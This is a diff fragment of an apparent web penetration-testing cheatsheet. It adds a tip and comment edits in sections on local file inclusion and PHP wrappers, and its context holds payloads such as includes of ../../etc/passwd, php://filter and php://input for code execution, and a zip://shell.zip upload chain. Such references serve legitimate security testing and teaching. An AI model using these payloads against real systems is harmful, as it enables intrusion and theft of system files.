@@ -105,7 +105,7 @@ $ go run main.go -u https://ns.agency -w ~/1_RECON/_WORDLISTS/Directories_Common
 ````  
 
 ### ============================================================
-### GENERAL HTTP TRICKERY
+### General HTTP trickery
 ### ============================================================
 
 Changing Content-Type:
@@ -133,6 +133,8 @@ A more in-depth LFI / LFI->RCE Cheatsheet:
 How to abuse PHP wrappers (ftp:// zip:// etc.) (RCE exploit)
 * https://www.securusglobal.com/community/2016/08/19/abusing-php-wrappers/
 * Write malicious PHP -> create .zip containing malicious PHP -> https://target.com/param?=zip://shell.zip -> RCE
+Other things:
+* Try URL paths without `.php` as source code may concat `.php` to the end of the user-input.
 
 STEP #1: Verify existence of LFI/LFD vulnerability.
 ```
@@ -187,7 +189,9 @@ PHP things:
 <?php include('../../etc/passwd'); ?>
 <?php include_once('../../etc/passwd'); ?> 
 
-/* Try these PHP protocol extensions */
+/* Try these PHP wrappers
+ * More: https://secure.php.net/manual/en/wrappers.php
+ */
 php://filter/resource=/etc/passwd    // 'resource' arg is required
 php://input               // RCE exploit: http://localhost/include.php?page=php://input%00  (null byte to cut off '.php')
 php://expect
